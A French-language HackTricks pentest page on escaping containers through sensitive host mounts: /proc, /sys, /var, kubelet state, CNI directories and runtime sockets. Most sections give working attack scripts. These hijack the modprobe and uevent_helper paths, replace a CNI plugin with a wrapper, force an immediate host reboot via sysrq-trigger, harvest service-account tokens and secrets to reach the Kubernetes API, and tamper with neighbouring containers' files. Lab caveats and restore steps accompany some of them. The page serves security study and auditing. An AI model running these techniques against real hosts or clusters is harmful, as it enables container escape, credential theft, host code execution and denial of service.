# Montages sensibles de l’hôte

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les montages de l’hôte constituent l’une des surfaces pratiques d’évasion de conteneur les plus importantes, car ils ramènent souvent une vue de processus soigneusement isolée à une visibilité directe des ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des sockets d’exécution, de l’état géré par kubelet ou des chemins liés aux périphériques peuvent exposer les contrôles du noyau, des identifiants, les systèmes de fichiers des conteneurs voisins et les interfaces de gestion du runtime.

Cette page est distincte des pages de protection individuelles, car le modèle d’abus est transversal. Un montage hôte accessible en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture d’AppArmor ou de SELinux, et en partie à cause du chemin exact de l’hôte qui a été exposé. Le traiter comme un sujet à part facilite grandement l’analyse de la surface d’attaque.

Comparez également un répertoire hôte accessible en écriture au chemin correspondant dans chaque conteneur. S’il est monté sur un répertoire de scripts de démarrage exécutables, un utilisateur de l’hôte moins privilégié peut éventuellement y déposer du code qu’un point d’entrée de conteneur plus privilégié chargera lors de son prochain redémarrage. Vérifiez la source et la destination exactes du bind mount, les permissions d’écriture et de recherche du répertoire, la boucle du point d’entrée et l’exigence d’un fichier exécutable, l’UID du runtime et l’existence d’un véritable déclencheur de redémarrage. L’UID 0 du conteneur n’est pas automatiquement l’UID 0 de l’hôte ; le mappage des user namespaces et la politique de montage déterminent l’effet sur l’hôte. Une analyse passive doit signaler les chemins et les permissions sans écrire de script ni redémarrer la charge de travail.

Un conteneur Linux peut se trouver dans une VM de gestion qui partage une partie du système de fichiers d’un hôte Windows distinct. Les [dossiers partagés VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) permettent notamment de rendre les fichiers de l’hôte visibles dans un invité, mais root dans cette VM reste une identité distincte de celle d’un administrateur Windows. Si le partage expose la clé privée SSH lisible d’un utilisateur, traitez-la comme une piste d’identifiant : vérifiez le montage exact adossé à l’hôte, la propriété et les droits d’accès à la clé, le compte correspondant et la politique effective des clés autorisées du serveur SSH Windows avant de conclure que la clé permet de se connecter à l’hôte. OpenSSH moderne sur [Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) utilise souvent un fichier `administrators_authorized_keys` distinct pour les comptes administrateurs. N’incluez pas le contenu des clés privées dans les sorties d’énumération courantes ; les métadonnées du montage et du chemin de la clé suffisent pour un triage passif.

## Exposition de `/proc`

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du noyau à fort impact. Un bind mount tel que `-v /proc:/host/proc` ou une vue du conteneur qui expose des entrées proc accessibles en écriture inattendues peut donc entraîner une divulgation d’informations, un déni de service ou l’exécution directe de code sur l’hôte.

Les chemins procfs à forte valeur comprennent :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (en particulier `register` et `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abus

Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou accessibles en écriture :

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des chemins d’exécution de code sur l’hôte s’ils sont accessibles en écriture. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont de précieuses sources de reconnaissance pour l’exploitation du kernel. `sched_debug` et `mountinfo` révèlent des informations sur les processus, les cgroups et les systèmes de fichiers, qui peuvent aider à reconstituer la configuration de l’hôte depuis le conteneur.

L’intérêt pratique de chaque chemin varie, et les traiter comme s’ils avaient tous le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
  S’il est accessible en écriture, c’est l’un des chemins procfs les plus critiques, car le kernel exécute un gestionnaire de pipe après un crash. Un conteneur qui peut faire pointer `core_pattern` vers un payload stocké dans sa couche overlay ou dans un chemin de l’hôte monté peut souvent obtenir une exécution de code sur l’hôte. Voir aussi [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
  Ce chemin contrôle l’helper userspace utilisé par le kernel lorsqu’il doit invoquer la logique de chargement des modules. S’il est accessible en écriture depuis le conteneur et interprété dans le contexte de l’hôte, il peut constituer une autre primitive d’exécution de code sur l’hôte. Il est particulièrement intéressant lorsqu’il est associé à un moyen de déclencher le chemin de l’helper.
- `/proc/sys/vm/panic_on_oom`
  Ce n’est généralement pas une primitive d’évasion directe, mais ce chemin peut transformer une pression mémoire en déni de service à l’échelle de l’hôte en convertissant les conditions OOM en panique du kernel.
- `/proc/sys/fs/binfmt_misc`
  Si l’interface d’enregistrement est accessible en écriture, l’attaquant peut enregistrer un gestionnaire associé à une valeur magique choisie et obtenir une exécution dans le contexte de l’hôte lorsqu’un fichier correspondant est exécuté.
- `/proc/config.gz`
  Utile pour le triage des exploits kernel. Il permet de déterminer quels sous-systèmes, mécanismes d’atténuation et fonctionnalités optionnelles du kernel sont activés, sans avoir besoin des métadonnées des paquets de l’hôte.
- `/proc/sysrq-trigger`
  Principalement un vecteur de déni de service, mais très grave. Il peut immédiatement redémarrer l’hôte, provoquer une panique du kernel ou perturber le système d’une autre manière.
- `/proc/kmsg`
  Révèle les messages du ring buffer du kernel. Utile pour l’empreinte de l’hôte et l’analyse des crashs, et, dans certains environnements, pour le leak d’informations utiles à l’exploitation du kernel.
- `/proc/kallsyms`
  Précieux lorsqu’il est lisible, car il expose les informations sur les symboles exportés du kernel et peut aider à contourner les hypothèses de randomisation des adresses lors du développement d’un exploit kernel.
- `/proc/[pid]/mem`
  Il s’agit d’une interface directe vers la mémoire d’un processus. Si le processus cible est accessible et que les conditions nécessaires de type ptrace sont remplies, elle peut permettre de lire ou de modifier la mémoire d’un autre processus. L’impact réel dépend fortement des credentials, de `hidepid`, de Yama et des restrictions ptrace ; c’est donc un chemin puissant, mais soumis à certaines conditions.
- `/proc/kcore`
  Expose une vue de la mémoire système sous forme d’image mémoire. Le fichier est volumineux et difficile à exploiter, mais s’il est réellement lisible, cela indique que la surface mémoire de l’hôte est gravement exposée.
- `/dev/kmem` et `/dev/mem`
  Il s’agit d’interfaces **device** brutes vers la mémoire, historiquement très sensibles, et non de fichiers procfs. Sur de nombreux systèmes modernes, elles sont absentes ou fortement restreintes, mais tout conteneur pouvant ouvrir une copie montée depuis l’hôte doit considérer cette exposition comme critique. Examinez-les avec les autres montages `/dev` sensibles au lieu de rechercher les chemins inexistants `/proc/kmem` ou `/proc/mem`.
- `/proc/sched_debug`
  Divulgue des informations sur l’ordonnancement et les tâches, susceptibles de révéler l’identité des processus de l’hôte même lorsque les autres vues des processus semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
  Très utile pour reconstituer l’emplacement réel du conteneur sur l’hôte, déterminer quels chemins reposent sur overlay et savoir si un montage accessible en écriture correspond à du contenu de l’hôte ou uniquement à la couche du conteneur.

Si `/proc/[pid]/mountinfo` ou les détails de l’overlay sont lisibles, utilisez-les pour retrouver le chemin sur l’hôte du système de fichiers du conteneur :

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Ces commandes sont utiles, car plusieurs techniques d’exécution sur l’hôte nécessitent de convertir un chemin situé dans le conteneur en chemin correspondant du point de vue de l’hôte.

### Exemple : préparer le chemin d’un helper `modprobe`

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le conteneur et que le chemin du helper est interprété dans le contexte de l’hôte, il peut être redirigé vers un payload contrôlé par l’attaquant. Le répertoire supérieur de l’overlay doit être résolu depuis l’hôte, et la preuve doit être écrite dans cette même couche du conteneur, visible depuis l’hôte, si le conteneur ne monte pas également le `/tmp` de l’hôte :

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Le déclencheur exact dépend de la cible et du comportement du kernel et n’est volontairement pas deviné. Restaurez la valeur d’origine avant de quitter le lab. L’essentiel est qu’un chemin auxiliaire accessible en écriture peut rediriger une future invocation d’un helper du kernel vers du contenu du chemin de l’hôte contrôlé par l’attaquant. Un `upperdir` d’overlay manquant, un chemin que l’hôte ne peut pas résoudre, un montage sysctl en lecture seule ou un kernel qui n’invoque jamais le helper sélectionné interrompent cette chaîne.

### Exemple complet : reconnaissance du kernel avec `kallsyms`, `kmsg` et `config.gz`

Si l’objectif est d’évaluer l’exploitabilité plutôt que de s’échapper immédiatement :

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Ces commandes aident à déterminer si des informations utiles sur les symboles sont visibles, si les messages récents du noyau révèlent un état intéressant et quelles fonctionnalités ou mesures d’atténuation du noyau sont intégrées. L’impact n’est généralement pas une évasion directe, mais cela peut considérablement accélérer le triage des vulnérabilités du noyau.

### Exemple complet : redémarrage de l’hôte via SysRq

Si `/proc/sysrq-trigger` est accessible en écriture et donne accès à la vue de l’hôte :

```bash
echo b > /proc/sysrq-trigger
```

L’effet est un redémarrage immédiat de l’hôte. Ce n’est pas un exemple subtil, mais il démontre clairement que l’exposition de procfs peut avoir des conséquences bien plus graves qu’une divulgation d’informations.

## Exposition de `/sys`

sysfs expose de grandes quantités d’état du noyau et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d’autres peuvent affecter l’exécution de helpers, le comportement des périphériques, la configuration des modules de sécurité ou l’état du firmware.

Les chemins sysfs à forte valeur incluent :

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans des environnements mal exposés. `/sys/kernel/vmcoreinfo` peut provoquer une fuite d’informations sur les vidages sur incident et la disposition du noyau, utiles au fingerprinting de bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par les Linux Security Modules ; un accès inattendu peut donc exposer ou modifier l’état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de démarrage stockés dans le firmware, ce qui les rend bien plus sensibles que des fichiers de configuration ordinaires. `debugfs`, sous `/sys/kernel/debug`, est particulièrement dangereux, car il s’agit volontairement d’une interface destinée aux développeurs, avec beaucoup moins d’exigences de sécurité que les API du noyau prévues pour la production.

Chaque entrée sysfs de cette liste dépend du **noyau, de sa configuration et du matériel**. Les nœuds virtualisés actuels omettent souvent entièrement `uevent_helper`, les variables EFI et les entrées des périphériques thermiques. Consignez un chemin absent comme un prérequis négatif au lieu de supposer qu’un exemple provenant d’un autre noyau s’applique.

Les commandes utiles pour examiner ces chemins sont :

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Ce qui rend ces commandes intéressantes :

- `/sys/kernel/security` peut révéler si AppArmor, SELinux ou une autre surface LSM est visible alors qu’elle aurait dû rester réservée à l’hôte.
- `/sys/kernel/debug` est souvent la découverte la plus alarmante de ce groupe. Si `debugfs` est monté et accessible en lecture ou en écriture, attendez-vous à une vaste surface exposée au noyau, dont le risque exact dépend des nœuds de débogage activés.
- L’exposition des variables EFI est moins courante, mais elle a un impact élevé, car elle concerne des paramètres stockés dans le firmware plutôt que des fichiers d’exécution ordinaires.
- `/sys/class/thermal` concerne principalement la stabilité de l’hôte et les interactions matérielles, plutôt que les techniques d’évasion de type shell.
- `/sys/kernel/vmcoreinfo` est principalement une source d’empreintes de l’hôte et d’analyse des crashs, utile pour comprendre l’état bas niveau du noyau.

### Exemple complet : `uevent_helper`

`/sys/kernel/uevent_helper` dépend du noyau et de sa configuration, et est absent sur de nombreux systèmes actuels. S’il existe, est accessible en écriture et qu’un déclencheur `uevent` utilisable est disponible, le noyau peut exécuter un helper contrôlé par l’attaquant. La sortie de preuve doit utiliser un chemin visible à la fois depuis l’hôte et depuis le conteneur :

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l’hôte. Une fois déclenché, le helper s’exécute dans le contexte de l’hôte plutôt qu’à l’intérieur du conteneur actuel. `/sys/class/mem/null/uevent` est un déclencheur concret sur les kernels qui l’exposent ; d’autres périphériques peuvent exposer leurs propres fichiers `uevent`, mais n’en sélectionnez pas un à l’aveugle sur du matériel réel. Restaurez la valeur d’origine avant de quitter le lab. Ne signalez pas cette technique comme disponible si le fichier helper ou un déclencheur contrôlé est absent.

## Exposition de `/var`

Le montage du `/var` de l’hôte dans un conteneur est souvent sous-estimé, car cela ne semble pas aussi spectaculaire que le montage de `/`. En pratique, cela peut suffire pour accéder aux sockets d’exécution, aux répertoires de snapshots des conteneurs, aux volumes de pods gérés par kubelet, aux jetons de compte de service projetés et aux systèmes de fichiers d’applications voisins. Sur les nœuds modernes, `/var` est souvent l’endroit où se trouve l’état des conteneurs le plus intéressant sur le plan opérationnel.

### Exemple Kubernetes

Un pod avec `hostPath: /var` peut souvent lire les jetons projetés d’autres pods et le contenu des snapshots overlay :

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Ces commandes sont utiles, car elles permettent de déterminer si le montage expose uniquement des données d’application sans grand intérêt ou des identifiants de cluster à fort impact. Un token de service account lisible peut immédiatement transformer une exécution de code locale en accès à l’API Kubernetes.

Si le token est présent, vérifiez ce à quoi il donne accès au lieu de vous arrêter à sa découverte :

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

L’impact peut ici être bien plus important qu’un simple accès au nœud local. Un token doté de permissions RBAC étendues peut transformer un `/var` monté en compromission de l’ensemble du cluster.

### Exemple avec Docker et containerd

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nœuds Kubernetes reposant sur containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Si le `/var` monté expose le contenu modifiable d’un snapshot appartenant à une autre charge de travail, l’attaquant peut être en mesure de modifier des fichiers de l’application, d’y déposer du contenu web ou de changer des scripts de démarrage sans toucher à la configuration du conteneur actuel.

Dans une **charge de travail de laboratoire jetable**, le contenu modifiable d’un snapshot peut servir à démontrer la falsification d’une application, la récupération de secrets ou le mouvement latéral. Faites d’abord correspondre l’ID du conteneur d’exécution au snapshot exact et ne modifiez jamais un snapshot sans rapport avec celui-ci ou un snapshot de production :

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Ces commandes sont utiles, car elles montrent les trois principales catégories d’impact d’un montage de `/var` : altération d’applications, récupération de secrets et lateral movement vers des workloads voisins.

Les écritures directes dans les snapshots contournent la gestion normale de l’état par le runtime et peuvent corrompre le conteneur ou détruire des preuves. La découverte en lecture seule a été reproduite localement avec `overlay2` de Docker : un marqueur écrit dans un conteneur jetable voisin est apparu sous `/var/lib/docker/overlay2/<id>/diff/`. Limitez toute modification réelle de snapshot à un conteneur jetable créé pour ce test.

## État de Kubelet, plugins et chemins CNI

Un montage de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` est souvent exposé par des DaemonSets privilégiés, des agents CNI, des plugins de nœud CSI, des opérateurs GPU et des utilitaires de stockage. Il est facile de considérer ces montages comme de simples « composants d’infrastructure du nœud », mais ils se trouvent directement dans le chemin d’exécution des nouveaux pods et contiennent souvent des identifiants kubelet, des secrets projetés, des sockets d’enregistrement et des binaires exécutables de plugins côté hôte.

Les cibles à forte valeur comprennent :

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Voici des commandes utiles pour l’audit :

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Pourquoi ces chemins sont importants :

- `/var/lib/kubelet/pki` peut exposer les certificats client du kubelet et d’autres identifiants locaux au nœud, qui peuvent parfois être réutilisés contre le serveur API ou les points de terminaison TLS accessibles au kubelet, selon la conception du cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` contient souvent des jetons de compte de service projetés et des Secrets montés pour les pods voisins sur le même nœud.
- `/var/lib/kubelet/pod-resources/kubelet.sock` est principalement une surface de reconnaissance, mais très utile : il révèle quels pods et conteneurs utilisent actuellement des GPU, de la mémoire hugepages, des périphériques SR-IOV et d’autres ressources locales rares du nœud.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA et de périphériques sont installés, ainsi que les sockets auxquels le kubelet est censé se connecter. Si ces répertoires sont accessibles en écriture et pas seulement en lecture, la découverte devient bien plus préoccupante.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du réseau des pods. Un accès en écriture à ces emplacements constitue souvent un moyen différé d’exécution sur l’hôte, plutôt qu’une simple exposition de la configuration.<sup>[[2]](#references)</sup>

### Exemple complet : `/opt/cni/bin` accessible en écriture

Si un répertoire de binaires CNI de l’hôte est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur l’hôte la prochaine fois que le kubelet crée un bac à sable de pod sur ce nœud :<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Ce n’est pas aussi immédiat qu’un `docker.sock` monté, mais c’est souvent plus réaliste dans des pods d’infrastructure Kubernetes compromis. Le marqueur est écrit à côté du plugin monté, afin que le conteneur puisse le récupérer même sans montage de host-root ou de host-`/tmp`. Le wrapper conserve les arguments d’origine et l’entrée standard, puis l’exemple restaure le binaire d’origine. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration réseau de l’hôte, et non par le conteneur actuel. Utilisez uniquement un nœud jetable, car un wrapper invalide peut empêcher les nouveaux sandboxes de Pods d’obtenir une configuration réseau.

## Sockets d’exécution

Les montages sensibles de l’hôte comprennent souvent des sockets d’exécution plutôt que des répertoires complets. Ils sont si importants qu’il convient de les rappeler explicitement ici :

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Voir [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour les séquences d’exploitation complètes une fois que l’un de ces sockets est monté.

Comme modèle de première interaction rapide :

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Si l’une de ces méthodes réussit, le chemin entre un « socket monté » et le lancement d’un conteneur frère plus privilégié est généralement bien plus court que n’importe quel chemin d’évasion du kernel.

Le même accès au daemon peut également permettre d’établir une **persistance sur l’hôte**. Un conteneur auxiliaire disposant d’un montage bind inscriptible de la racine de l’hôte peut recevoir des fichiers via `docker cp`, puis utiliser `docker exec` pour placer une clé SSH, une unité de service ou un autre fichier de persistance dans le chemin de l’hôte monté. La frontière de sécurité repose sur l’autorité du daemon à créer le montage sur l’hôte ; `docker cp` n’est qu’une étape de transfert. Après l’exposition d’un socket d’exécution, auditez à la fois les conteneurs nouvellement créés et les écritures dans les chemins d’authentification ou de démarrage de l’hôte.

## Détournement de tâches via un chemin hôte inscriptible

Un montage hôte inscriptible n’a pas besoin d’exposer `/` pour être dangereux. Si le chemin monté contient des scripts, des fichiers de configuration, des hooks, des plugins ou des fichiers utilisés ultérieurement par une tâche planifiée ou un service côté hôte, le conteneur peut être en mesure de modifier ce que l’hôte exécute.

Processus de vérification générique :

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Si un fichier accessible en écriture est utilisé par un processus hôte, gardez la charge utile simple et observable pendant les tests :

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

La partie intéressante est la frontière de confiance : l’écriture a lieu depuis le conteneur, mais l’exécution se produit plus tard dans le contexte d’un service de l’hôte. Un hostPath ou bind mount étroit devient ainsi un mécanisme d’exécution de code différée sur l’hôte.

## Fichiers appartenant à root sur un chemin partagé avec l’hôte

Un compte de conteneur pouvant devenir root peut être en mesure de placer un fichier appartenant à root sur un chemin accessible en écriture également utilisé par l’hôte. Si l’UID 0 du conteneur correspond à l’UID 0 de l’hôte, les deux vues désignent le même fichier et si le montage de l’hôte autorise l’exécution SUID, un utilisateur de l’hôte pouvant exécuter sur ce chemin un exécutable SUID appartenant à root peut franchir la frontière de privilèges de l’hôte. Pour ce problème spécifique de propriété des fichiers, le conteneur n’a pas besoin d’être lancé avec `--privileged`. Consultez les [mappages des user namespaces](protections/namespaces/user-namespace.md) et la [discussion sur SUID](privileged-containers.md) pour connaître les conditions distinctes.

Examinez le chemin des **deux côtés** : comparez la propriété et l’identité d’un fichier inoffensif, vérifiez `uid_map` et `gid_map` du conteneur, puis inspectez les options de montage et la politique d’exécution de l’hôte. `rw` côté conteneur sans `nosuid` n’est qu’un indice ; cela ne permet pas d’établir la propriété sur l’hôte, les options de montage de l’hôte, l’accès d’un utilisateur de l’hôte, ni si AppArmor/SELinux bloque l’exécution. `noexec` limite l’exécution dans la vue où il s’applique. Les tags `shared:` et `master:` dans `/proc/self/mountinfo` décrivent la propagation du montage, et non le partage du contenu des fichiers avec l’hôte. Un bind mount peut ne pas comporter ces tags. La réutilisation d’identifiants permettant une connexion à l’hôte est une étape distincte de la frontière de privilèges liée au fichier partagé.

Le stockage du runtime de l’hôte peut créer un chemin similaire, même sans bind mount explicite. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) permettait à un utilisateur non privilégié de l’hôte de parcourir les sous-répertoires de données Docker et d’exécuter des fichiers issus d’un système de fichiers de conteneur ; Moby a corrigé les permissions dans la version 20.10.9 et précise que les conteneurs en cours d’exécution doivent être redémarrés pour corriger leurs répertoires. Examinez les chemins exacts `overlay2/<id>/merged` montés et les permissions de recherche de chaque répertoire parent, puis vérifiez si l’UID 0 du conteneur correspond à l’UID 0 de l’hôte, si un véritable exécutable SetUID appartenant à root est présent et accessible, et si la vue de l’hôte autorise l’exécution SetUID. Les conteneurs rootless ou utilisant le remappage des user namespaces, `nosuid`, `noexec`, `no_new_privs` et les politiques MAC peuvent modifier le résultat. Une version de runtime ou un chemin accessible à la traversée ne constitue qu’un indice à examiner, pas une preuve d’exécution en tant que root sur l’hôte ; inspectez les métadonnées du montage et du fichier sans exécuter un exécutable candidat.

## CVE liées aux montages

Les montages de l’hôte peuvent également être concernés par des vulnérabilités du runtime. Parmi les exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un descripteur de fichier de répertoire divulgué pouvait placer le répertoire de travail sur le système de fichiers de l’hôte.
- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles malveillants, des frontends et des opérations `RUN --mount` pouvaient réintroduire l’accès aux fichiers de l’hôte, leur suppression ou une élévation de privilèges pendant les builds.
- `CVE-2024-1753` dans les opérations de build de Buildah et Podman, où des bind mounts conçus à cet effet pendant le build pouvaient exposer `/` en lecture-écriture.
- `CVE-2025-47290` dans `containerd` 2.1.0, où une condition TOCTOU pendant le décompactage d’une image pouvait permettre à une image spécialement conçue de modifier le système de fichiers de l’hôte pendant le téléchargement.

Ces CVE sont pertinentes ici, car elles montrent que la gestion des montages ne dépend pas uniquement de la configuration de l’opérateur. Le runtime lui-même peut également introduire des conditions d’évasion liées aux montages.

## Vérifications

Utilisez ces commandes pour repérer rapidement les expositions de montage les plus importantes :

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Ce qui est intéressant ici :

- La racine de l’hôte, `/proc`, `/sys`, `/var` et les sockets du runtime sont des éléments à examiner en priorité.
- Les entrées proc/sys inscriptibles indiquent souvent que le montage expose des contrôles du noyau globaux à l’hôte, plutôt qu’une vue sûre du conteneur.
- Les chemins `/var` montés méritent un examen des identifiants et des workloads voisins, pas seulement du système de fichiers.
- Les répertoires d’état de Kubelet et les chemins CNI/plugin méritent la même priorité que les sockets du runtime, car ils se trouvent souvent directement sur le chemin de création des pods et de distribution des identifiants du nœud.

## État de la validation locale

Les chaînes pratiques de cette page ont été vérifiées sur un nœud Linux minikube local. La validation a reproduit :

- l’accès en lecture et en écriture via un hostPath temporaire inscriptible
- la découverte de tokens ServiceAccount projetés et de Secrets montés via `/var/lib/kubelet/pods`
- l’authentification réussie auprès de l’API Kubernetes avec un token actif récupéré dans cet état Kubelet monté
- la découverte en lecture seule d’un système de fichiers Docker `overlay2` voisin via `/var` monté
- la création, via l’API Docker, d’un conteneur frère avec un bind mount de l’hôte en lecture seule via un `docker.sock` monté
